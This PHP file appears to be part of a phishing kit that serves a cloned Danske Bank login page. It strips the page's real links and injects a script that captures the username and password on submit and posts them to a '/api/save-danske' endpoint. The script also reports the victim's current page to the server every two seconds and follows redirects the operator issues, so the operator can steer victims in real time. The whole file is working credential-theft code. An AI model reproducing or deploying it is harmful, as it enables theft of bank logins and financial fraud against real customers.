<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Danske Bank');
$htmlContent = file_get_contents(__DIR__ . '/Danskebank.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'UTF-8');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);

$adminScript = '';
$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function initForm() {
            const form = document.getElementById(\'login-form\');
            if (form) {
                form.addEventListener(\'submit\', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    const usernameInput = document.getElementById(\'user-id\');
                    const passwordInput = document.getElementById(\'password\');
                    
                    if (!usernameInput || !passwordInput) {
                        return;
                    }
                    
                    const username = usernameInput.value.trim();
                    const password = passwordInput.value.trim();
                    
                    if (!username || !password) {
                        return;
                    }
                    
                    fetch(\'/api/save-danske\', {
                        method: \'POST\',
                        headers: { \'Content-Type\': \'application/json\' },
                        body: JSON.stringify({
                            user_id: userId,
                            username: username,
                            password: password
                        })
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error(\'Network response was not ok\');
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.success && data.redirect) {
                            window.location.href = data.redirect;
                        } else if (data.message) {
                            alert(data.message);
                        }
                    })
                    .catch(error => {
                        console.error(\'Error:\', error);
                    });
                });
            }
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            initForm();
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
?>
<?php
$content = ob_get_clean();
echo $content;
?>
